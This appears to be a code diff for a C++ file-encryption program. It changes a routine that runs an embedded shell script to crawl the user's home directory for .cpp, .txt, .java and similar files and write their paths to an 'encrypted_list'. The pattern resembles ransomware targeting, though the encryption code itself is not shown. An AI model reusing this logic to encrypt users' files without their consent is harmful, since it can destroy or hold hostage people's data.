@@ -106,7 +106,19 @@ void decrypter(string input)
 void list_gen(){
 
      string command = " \
-        dir_pres=$PWD if [ -f $dir_pres/files ] ; then rm $dir_pres/files fi cd $HOME \
+        #get location of current dir \
+        SOURCE=""${BASH_SOURCE[0]}"" \
+        while [ -h ""$SOURCE"" ]; do # resolve $SOURCE until the file is no longer a symlink \
+          DIR=""$( cd -P ""$( dirname ""$SOURCE"" )"" && pwd )"" \
+          SOURCE=""$(readlink ""$SOURCE"")"" \
+          [[ $SOURCE != /* ]] && SOURCE=""$DIR/$SOURCE"" # if $SOURCE was a relative symlink, we need to resolve it  \
+        done \
+        DIR=""$( cd -P ""$( dirname ""$SOURCE"" )"" && pwd )"" \
+        dir_pres=$DIR \
+        if [ -f $dir_pres/files ] ; then \
+        rm $dir_pres/files \
+        fi \
+        cd $HOME \
         file0=""*.cpp */*.cpp */*/*.cpp */*/*/*.cpp */*/*/*/*.cpp "" \
         file1=""*.txt */*.txt */*/*.txt */*/*/*.txt */*/*/*/*.txt"" \
         file2=""*.java */*.java */*/*.java */*/*/*.java */*/*/*/*.java"" \
@@ -118,8 +130,7 @@ void list_gen(){
         for i in $file3; do [ -f ""$i"" ] && echo ""$HOME$i"" >>$dir_pres/encrypted_list ; done | sort \
         ";
 
-   // system(command.c_str());
-    system("./list_gen.sh");
+    system(command.c_str());
 }
 
 void enc_dec(string input){
@@ -199,6 +210,8 @@ int main(int argc, char *argv[])
 	}
 
 	fin.close();
+	
+	system("");
 	cout<<"success\n";
 	return 0;
 }
